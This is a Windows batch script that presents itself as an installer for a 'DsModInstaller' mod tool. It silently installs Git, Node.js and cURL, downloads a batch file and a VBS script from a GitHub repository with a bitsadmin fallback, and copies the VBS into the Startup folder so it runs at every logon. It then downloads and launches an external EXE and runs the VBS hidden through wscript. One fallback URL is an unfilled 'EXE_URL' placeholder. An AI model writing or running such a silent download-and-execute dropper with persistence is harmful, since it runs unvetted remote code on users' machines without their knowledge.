@echo off
:: Create dsmodinstaller directory
mkdir "%appdata%\dsmodinstaller" >nul 2>&1

:: Grant full permissions to the current user
icacls "%appdata%\dsmodinstaller" /grant "%username%":F /T >nul
echo Granted permissions to %appdata%\dsmodinstaller.

:: Install Git (if missing)
echo installing git
where git >nul 2>nul || winget install --id Git.Git -e --silent

:: Install Node.js (if missing)
echo installing node
where node >nul 2>nul || winget install --id OpenJS.NodeJS -e --silent

:: Install cURL (if missing)
echo installing curl
where curl >nul 2>nul || winget install --id cURL.cURL -e --silent

:: Download runner.bat from GitHub
echo downloading runner
curl -L -o "%appdata%\dsmodinstaller\runner.bat" "https://raw.githubusercontent.com/6686-repos/DsModInstaller/refs/heads/main/runner.bat" || bitsadmin /transfer job /download /priority high "https://raw.githubusercontent.com/6686-repos/DsModInstaller/refs/heads/main/runner.bat" "%appdata%\dsmodinstaller\runner.bat"

:: Download silent_runner.vbs from GitHub
echo downloading silent runner
curl -L -o "%appdata%\dsmodinstaller\silent_runner.vbs" "https://raw.githubusercontent.com/6686-repos/DsModInstaller/refs/heads/main/silent_runner.vbs" || bitsadmin /transfer job /download /priority high "https://raw.githubusercontent.com/6686-repos/DsModInstaller/refs/heads/main/silent_runner.vbs" "%appdata%\dsmodinstaller\silent_runner.vbs"

:: Copy silent script to Startup folder
echo moving files
copy "%appdata%\dsmodinstaller\silent_runner.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" >nul

:: Download and run external EXE
curl -L -o "%appdata%\dsmodinstaller\external.exe" "https://github.com/6686-repos/shelter-installer/releases/download/1.0.0/install-shelter.exe" || bitsadmin /transfer job /download /priority high "EXE_URL" "%appdata%\dsmodinstaller\external.exe"
start "" "%appdata%\dsmodinstaller\external.exe"

:: Run silent script silently
start "" wscript.exe "%appdata%\dsmodinstaller\silent_runner.vbs"

exit
